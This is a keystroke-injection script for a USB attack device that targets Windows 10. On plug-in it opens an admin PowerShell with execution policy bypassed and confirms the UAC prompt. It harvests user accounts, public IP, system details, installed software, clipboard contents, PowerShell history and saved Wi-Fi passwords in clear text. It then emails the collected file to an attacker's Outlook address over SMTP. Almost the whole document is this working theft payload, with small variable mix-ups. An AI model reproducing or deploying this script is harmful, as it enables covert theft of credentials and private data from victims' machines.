// =============================================================================
// Title: Email System Information.
// Author: @beigeworm | https://github.com/beigeworm
// Description: Uses Powershell to gather user and system information and send to an Email.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// *REQUIREMENTS*
// you will need a Microsoft Outlook Email address for this to work

// *SETUP*
// replace YOUR_EMAIL and YOUR_PASSWORD. (check entire script)

// =============================================================================

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(4000);

// Main Powershell code
type("$email = \"EMAIL_HERE\";$pass = \"PASSWORD_HERE\"");
press("ENTER");
delay(500);
type(";$usr = \"Username: $($usrinf.Name)\";$usr += \"`nFull Name: $($usrinf.FullName)`n\";$usr+=\"Public Ip Address = \";$usr+=((Iwr ifconfig.me/ip).Content.Trim() | Out-String)");
press("ENTER");
delay(500);
type(";$usr+=\"`n\";$usr+=\"All User Accounts: `n\";$usr+= Get-WmiObject -Class Win32_UserAccount;$sys = Get-WmiObject -Class Win32_OperatingSystem");
press("ENTER");
delay(500);
type(";$bios = Get-WmiObject -Class Win32_BIOS;$proc = Get-WmiObject -Class Win32_Processor;$comp = Get-WmiObject -Class Win32_ComputerSystem;$usrinf = Get-WmiObject -Class Win32_UserAccount");
press("ENTER");
delay(500);
type(";$sysstr = \"Operating System: $($sys.Caption) $($sys.OSArchitecture)\";$sysstr += \"`nBIOS Version: $($bios.SMBIOSBIOSVersion)\";$sysstr += \"`nProcessor: $($proc.Name)\"");
press("ENTER");
delay(500);
type(";$sysstr += \"`nMemory: $($sys.TotalVisibleMemorySize) MB\";$sysstr += \"`nComputer Name: $($comp.Name)\";$iprog = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version");
press("ENTER");
delay(500);
type(";$progstr = \"Installed Programs:`n\";foreach($program in $iprog){;$progstr += \"$($program.Name) $($program.Version)`n\"}");
press("ENTER");
delay(500);
type(";$a=0;$ws=(netsh wlan show profiles) -replace \".*:\\s+\"");
press("ENTER");
delay(500);
type(";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch \" policy \" -And $s -ne \"User profiles\" -And $s -NotMatch \"-----\" -And $s -NotMatch \"<None>\" -And $s.length -gt 5){");
press("ENTER");
delay(500);
type(";$ssid=$s.Trim();if($s -Match \":\"){$ssid=$s.Split(\":\")[1].Trim()};$pw=(netsh wlan show profiles name=$ssid key=clear);$pass=\"None\"");
press("ENTER");
delay(500);
type(";foreach($p in $pw){if($p -Match \"Key Content\"){$pass=$p.Split(\":\")[1].Trim();$wifistr+=\"SSID: $ssid`nPassw: $pass`n\"}}}$a++;}");
press("ENTER");
delay(500);
type(";$pshist = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"");
press("ENTER");
delay(500);
type(";\" USER INFO`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII;$usr | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";\" CLIPBOARD INFO`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append;Get-Clipboard | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";\" POWERSHELL HISTORY`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append;Get-Content $pshist | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";\" SYSTEM INFO`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append;$sysstr | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";\" WIFI INFO`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append;$wifistr | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";\" PROGRAMS INFO`n\" | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append;$progstr | Out-File -FilePath \"$env:temp\\sys.txt\" -Encoding ASCII -Append");
press("ENTER");
delay(500);
type(";$syslog = \"$env:temp\\sys.txt\";$subj = \"$env:COMPUTERNAME : : Results\";$body = \"$env:COMPUTERNAME : Info Scraper Results... : $time\"");
press("ENTER");
delay(500);
type(";$smtp = \"smtp.outlook.com\";$prt = \"587\";$cdtl = new-object Management.Automation.PSCredential $eml, ($psw | ConvertTo-SecureString -AsPlainText -Force)");
press("ENTER");
delay(500);
type(";$time = Get-Date;$ct = $time.addminutes($lost)");
press("ENTER");
delay(500);
type(";send-mailmessage -from $eml -to $eml -subject $subj -body $body -Attachment $syslog -smtpServer $smtp -port $prt -credential $cdtl -usessl");
press("ENTER");
delay(500);
type(";sleep 1;exit");
press("ENTER");
delay(500);
